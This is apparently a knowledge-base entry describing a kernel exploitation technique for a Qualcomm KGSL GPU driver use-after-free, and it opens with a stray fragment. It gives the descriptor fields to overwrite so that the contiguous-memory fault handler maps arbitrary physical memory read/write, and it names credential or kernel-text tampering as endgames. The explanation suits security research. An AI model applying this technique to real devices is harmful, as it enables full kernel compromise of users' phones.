copy commands and scan them for a

title: HT: `kgsl_memdesc` page-fault-handler pivot (qualcomm-kgsl-vbo-bind-race-physical-uaf)
text: ## `kgsl_memdesc` page-fault-handler pivot A reclaimed `kgsl_mem_entry` contains an embedded `kgsl_memdesc`. Normal page-backed objects use `kgsl_page_ops`, whose fault handler obtains a `struct page *` from `memdesc->pages[pgoff]`. KGSL also contains `kgsl_contiguous_ops`; its fault handler instead computes the PFN directly from fields in the descriptor:<sup>[[1]](#references)</sup> ```c offset = (vmf->address - vma->vm_start) >> PAGE_SHIFT; pfn = (memdesc->physaddr >> PAGE_SHIFT) + offset; return vmf_insert_pfn(vma, vmf->address, pfn); ``` Use the stale GPU mapping to change the overlapping descriptor as follows:<sup>[[1]](#references)</sup> ```text memdesc.ops = &kgsl_contiguous_ops memdesc.physaddr = chosen_physical_base memdesc.size = desired_mapping_length ``` Calling `mmap()` on that KGSL object and faulting its pages now makes the legitimate contiguous-memory handler insert PFNs derived from attacker-controlled fields. If the target's physical layout is known, this converts one corruptible object into a userspace mapping of kernel physical memory with read/write access. The technique reuses an existing type-correct operations table rather than forging executable code or a new table.<sup>[[1]](#references)</sup> Writable physical access bypasses ordinary kernel virtual-page permissions. Device-specific endgames include changing credential fields or modifying kernel text and then invoking the modified function. Such targets require exact symbols and offsets for the running build.<sup>[[1]](#references)</sup>
